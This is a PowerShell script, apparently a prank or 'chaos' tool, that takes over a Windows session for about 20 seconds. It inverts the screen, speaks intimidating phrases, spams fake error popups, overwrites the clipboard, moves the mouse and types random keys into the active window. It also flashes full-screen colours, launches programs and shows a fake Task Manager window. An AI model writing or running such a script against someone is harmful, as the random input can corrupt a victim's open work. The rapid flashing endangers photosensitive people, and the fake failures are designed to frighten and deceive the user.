Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Speech

# Invert screen colors using Magnifier
Start-Process "magnify.exe"
Start-Sleep -Seconds 2
[System.Windows.Forms.SendKeys]::SendWait("^{%}{i}")

# VOICE ATTACK
Start-Job {
    $speak = New-Object -ComObject SAPI.SpVoice
    $words = "Chaos", "System overload", "I see you", "No escape", "Collapse", "Everything is noise"
    for ($i = 0; $i -lt 20; $i++) {
        $speak.Speak($words | Get-Random)
        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 400)
    }
}

# POPUP SPAM
Start-Job {
    for ($i = 0; $i -lt 50; $i++) {
        $msg = "ERROR CODE 0x" + (Get-Random -Minimum 1000 -Maximum 9999)
        [System.Windows.Forms.MessageBox]::Show($msg, "System Failure", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
        Start-Sleep -Milliseconds 250
    }
}

# CLIPBOARD CHAOS
Start-Job {
    for ($i = 0; $i -lt 100; $i++) {
        Set-Clipboard ("💥 CHAOS MODE 💀 " * (Get-Random -Minimum 3 -Maximum 6))
        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 200)
    }
}

# RANDOM MOUSE
Start-Job {
    for ($i = 0; $i -lt 1000; $i++) {
        $x = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width)
        $y = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
        Start-Sleep -Milliseconds (Get-Random -Minimum 10 -Maximum 40)
    }
}

# RANDOM INPUT
Start-Job {
    $keys = @("A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","1","2","3","4","5")
    for ($i = 0; $i -lt 1000; $i++) {
        [System.Windows.Forms.SendKeys]::SendWait($keys | Get-Random)
        Start-Sleep -Milliseconds (Get-Random -Minimum 5 -Maximum 30)
    }
}

# FULLSCREEN FLASH
Start-Job {
    for ($i = 0; $i -lt 30; $i++) {
        $form = New-Object Windows.Forms.Form
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.WindowState = 'Maximized'
        $form.BackColor = [System.Drawing.Color]::FromArgb(
            (Get-Random -Minimum 0 -Maximum 255),
            (Get-Random -Minimum 0 -Maximum 255),
            (Get-Random -Minimum 0 -Maximum 255))
        $form.Show()
        Start-Sleep -Milliseconds (Get-Random -Minimum 80 -Maximum 160)
        $form.Close()
    }
}

# LAUNCH RANDOM APPS
Start-Job {
    $apps = @("notepad", "calc", "mspaint", "write", "cmd")
    for ($i = 0; $i -lt 20; $i++) {
        Start-Process ($apps | Get-Random)
        Start-Sleep -Milliseconds 300
    }
}

# BEEP STORM
Start-Job {
    for ($i = 0; $i -lt 100; $i++) {
        [console]::beep((Get-Random -Minimum 100 -Maximum 3000), (Get-Random -Minimum 50 -Maximum 200))
    }
}

# Fake Taskbar Flash
Start-Job {
    $f = New-Object Windows.Forms.Form
    $f.Text = "taskmgr.exe"
    $f.BackColor = 'Red'
    $f.TopMost = $true
    $f.Width = 300
    $f.Height = 100
    $f.Show()
    Start-Sleep -Seconds 10
    $f.Close()
}

# Wrap up after ~20 seconds
Start-Sleep -Seconds 20
[System.Windows.Forms.SendKeys]::SendWait("^{%}{i}")  # Undo invert
Write-Host "`n💀 Annihilation Complete. Reboot to recover sanity." -ForegroundColor Red
